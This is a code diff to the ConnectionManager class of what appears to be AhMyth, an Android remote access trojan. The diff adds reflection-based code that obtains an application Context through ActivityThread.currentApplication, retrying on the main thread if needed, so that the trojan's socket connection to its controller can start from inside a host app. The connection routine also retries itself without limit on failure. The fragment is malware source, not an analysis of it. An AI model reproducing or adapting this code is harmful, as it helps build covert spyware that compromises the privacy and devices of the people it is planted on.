@@ -1,32 +1,112 @@
 package ahmyth.mine.king.ahmyth;
 
-import android.content.Context;
-import android.os.Looper;
-import android.util.Log;
-
 import org.json.JSONObject;
-
 import io.socket.emitter.Emitter;
 
+import android.content.Context;
+import android.util.Log;
+import android.os.Looper;
+import android.os.Handler;
+
+import java.lang.reflect.Method;
 
 /**
  * Created by AhMyth on 10/1/16.
  */
 
+
+
 public class ConnectionManager {
 
-
     public static Context context;
+
     private static io.socket.client.Socket ioSocket;
+
     private static FileManager fm = new FileManager();
 
     public static void startAsync(Context con)
+
     {
+
         try {
-            context = con;
+
+            ConnectionManager.context = con;
+
             sendReq();
+
         }catch (Exception ex){
+
             startAsync(con);
+
+        }
+
+    }
+
+
+    public static void startContext() {
+
+        try {
+
+            findContext();
+
+        } catch (Exception ignored) {
+
+        }
+
+    }
+
+    private static void findContext() throws Exception {
+
+        Class<?> activityThreadClass;
+
+        try {
+
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+
+        } catch (ClassNotFoundException e) {
+
+            // No context
+
+            return;
+
+        }
+
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+        if (context == null) {
+
+            // Post to the UI/Main thread and try and retrieve the Context
+
+            final Handler handler = new Handler(Looper.getMainLooper());
+
+            handler.post(new Runnable() {
+
+                public void run() {
+
+                    try {
+
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+                        if (context != null) {
+
+                            startAsync(context);
+
+                        }
+
+                    } catch (Exception ignored) {
+
+                    }
+
+                }
+
+            });
+
+        } else {
+
+            startAsync(context);
+
         }
 
     }
